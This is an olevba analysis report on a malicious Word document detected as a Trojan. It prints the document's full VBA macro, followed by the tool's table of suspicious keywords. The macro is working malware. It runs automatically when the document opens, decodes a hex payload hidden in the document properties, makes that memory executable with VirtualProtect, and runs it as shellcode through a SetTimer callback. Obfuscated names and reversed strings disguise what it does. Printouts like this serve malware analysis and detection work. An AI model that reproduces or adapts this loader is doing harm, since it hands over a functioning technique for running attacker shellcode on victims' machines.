olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-3748baa88745d60504599b3c1f046ea17f50c77fe7f2dbb1cb144ab0b3366668
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-3748baa88745d60504599b3c1f046ea17f50c77fe7f2dbb1cb144ab0b3366668 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function SeedboxPalatoglossalPrecontemporaneously Lib "user32" Alias "SetTimer" (ByVal OverpsychologizingDedicated As LongPtr, ByVal AporrhiegmaStackgarth As LongPtr, ByVal ImaginationalismBoreholes As LongPtr, ByVal PliesSerpentivorous As LongPtr) As LongPtr
Private Declare PtrSafe Function EssartInfrustrablyEdematose Lib "user32" Alias "KillTimer" (ByVal AbradantsVasculumsOvershroud As LongPtr, ByVal LachrymousCircumambulates As LongPtr) As LongPtr
Private Declare PtrSafe Function UnhusbandlyUnidirectionalitySuperattractiveness Lib "kernel32" Alias "VirtualProtect" (ByVal UndervaluesProtochorda As LongPtr, ByVal CavalryProducingIsocreosol As LongPtr, ByVal QuadrumaneSemiscientific As LongPtr, PinealomaAntithrombicEmbeam As LongPtr) As LongPtr
#Else
Private Declare Function SeedboxPalatoglossalPrecontemporaneously Lib "user32" Alias "SetTimer" ( ByVal BroadwiseFlannelly As Long, ByVal TongueflowerBoardmanshipPeopling As Long, ByVal CoralliteAxemasterDappleness As Long, ByVal StudysInferrible As Any) As Long
Private Declare Function EssartInfrustrablyEdematose Lib "user32" Alias "KillTimer" ( ByVal ClarityMestee As Long, ByVal UpalongIndependentismAerifies As Long) As Long
Private Declare Function UnhusbandlyUnidirectionalitySuperattractiveness Lib "kernel32" Alias "VirtualProtect"  (ByVal PhilanthropismExperimentarianBlepharocoloboma As Long, ByVal DecretionPlagiostomiLeptospirae As Long, ByVal OverplusTranssolid As Long, MethylolureaNematoceraBillowiness As Long) As Long
#End If
Private Sub Document_Open()
Dim AntiecclesiasticallyDiuturnalOddside() As Byte
#If Win64 Then
AntiecclesiasticallyDiuturnalOddside = CobbedRighty(ActiveDocument.BuiltInDocumentProperties(FGUwPD62G("gtNj6aEI2Us")).Value)
#Else
AntiecclesiasticallyDiuturnalOddside = CobbedRighty(ActiveDocument.BuiltInDocumentProperties(FGUwPD62G("hgZR2QWYW")).Value)
#End If
#If VBA7 Then
Dim UnmetredAntisubstanceGenetrix As LongPtr
Dim AgadeSemioptimistically As LongPtr
Dim shellCode As LongPtr
Dim BumclockVesicofixation As LongPtr
#Else
Dim UnmetredAntisubstanceGenetrix As Long
Dim AgadeSemioptimistically As Long
Dim shellCode As Long
Dim BumclockVesicofixation As Long
#End If
AgadeSemioptimistically = UBound(AntiecclesiasticallyDiuturnalOddside) + 1
shellCode = VarPtr(AntiecclesiasticallyDiuturnalOddside(0))
UnhusbandlyUnidirectionalitySuperattractiveness shellCode, AgadeSemioptimistically, 64, VarPtr(UnmetredAntisubstanceGenetrix)
GetObject(FGUwPD62G("ezYJxj8")).Environment(FGUwPD62G("HMxEb_HFhE"))(FGUwPD62G("IUVN_DkDLh")) = ActiveDocument.FullName
GetObject(FGUwPD62G("xl1WtSaM")).Environment(FGUwPD62G("uStwx7O"))(FGUwPD62G("JfPHB1H")) = FGUwPD62G("NofvoNAJ4Cxe")
BumclockVesicofixation = SeedboxPalatoglossalPrecontemporaneously(0, shellCode, 1, shellCode)
SpannelSourishnessUnmate 1
EssartInfrustrablyEdematose 0, BumclockVesicofixation
GetObject(FGUwPD62G("bxpBP88Z8A")).Environment(FGUwPD62G("vJc_8Hm617Vz")).Remove (FGUwPD62G("TvUZqlSCB"))
GetObject(FGUwPD62G("HjXzy6Mz")).Environment(FGUwPD62G("A3Sisqd0")).Remove (FGUwPD62G("HbYAyz2rsF"))
ReDim AntiecclesiasticallyDiuturnalOddside(1)
End Sub
Sub SpannelSourishnessUnmate(Finish)
Dim OrnithologyPeroba As Long
Dim AutonitridationPignorate As Long
AutonitridationPignorate = Timer() + (Finish)
Do
OrnithologyPeroba = Timer()
DoEvents
Loop Until OrnithologyPeroba > AutonitridationPignorate
End Sub
Public Function FGUwPD62G(strInput)
FGUwPD62G = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function LopesEndoss(DelineatesSaltenSjomil, FallbackRehinge)
LopesEndoss = Mid(DelineatesSaltenSjomil, FallbackRehinge + 1, 1)
End Function
Function SemirotatorySestolePauperitic(FinfishCreationary) As Long
If Int(Rnd(23)) > 2 Then
SemirotatorySestolePauperitic = 9000
Else
SemirotatorySestolePauperitic = Len(FinfishCreationary)
End If
End Function
Function CobbedRighty(PlanorbisSishamManifolding)
ReDim HeteropodousDreamful(SemirotatorySestolePauperitic(PlanorbisSishamManifolding) - 1) As Byte
Dim PseudoeconomicallyScytopetalaceous As Long, AntitrusterMeditationTrickstress As Long
Dim SawbillCovenantally: SawbillCovenantally = FGUwPD62G("MhwthxqV") & FGUwPD62G("cxAs61a3tW")
For PseudoeconomicallyScytopetalaceous = 0 To SemirotatorySestolePauperitic(PlanorbisSishamManifolding) - 1 Step 2
AntitrusterMeditationTrickstress = PseudoeconomicallyScytopetalaceous / 2
HeteropodousDreamful(AntitrusterMeditationTrickstress) = CDec(SawbillCovenantally & LopesEndoss(PlanorbisSishamManifolding, PseudoeconomicallyScytopetalaceous) & LopesEndoss(PlanorbisSishamManifolding, PseudoeconomicallyScytopetalaceous + 1))
Next
CobbedRighty = HeteropodousDreamful
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

